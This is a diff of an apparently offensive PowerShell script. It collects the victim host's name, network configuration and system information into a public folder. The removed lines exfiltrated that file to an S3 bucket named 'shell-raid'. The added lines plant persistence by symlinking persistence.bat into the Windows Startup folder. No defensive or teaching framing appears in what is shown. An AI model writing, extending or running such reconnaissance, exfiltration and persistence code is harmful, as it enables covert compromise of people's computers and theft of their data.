@@ -11,19 +11,7 @@ $systeminfo = (systeminfo | Out-String)
 $info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
 $info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"
 
-# Upload the file to AWS S3
-$bucketName = "shell-raid"
-$s3Key = "sysinfo-$(hostname)-$(Get-Date -Format 'yyyyMMddHHmmss').txt"
+$source = "C:\Users\Public\persistence.bat"
+$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\persistence.bat"
+cmd /c mklink `"$shortcut`" `"$source`"
 
-# Ensure AWS Tools for PowerShell is installed
-if (-not (Get-Command -Name "Write-S3Object" -ErrorAction SilentlyContinue)) {
-    Install-Module -Name "AWSPowerShell" -Force -Scope CurrentUser
-}
-
-# Upload the file to S3
-try {
-    Write-S3Object -BucketName $bucketName -Key $s3Key -File $infoFilePath -Region "ap-southeast-2"
-    Write-Output "File uploaded successfully to S3: $bucketName/$s3Key"
-} catch {
-    Write-Output "Failed to upload file to S3. Error: $_"
-}
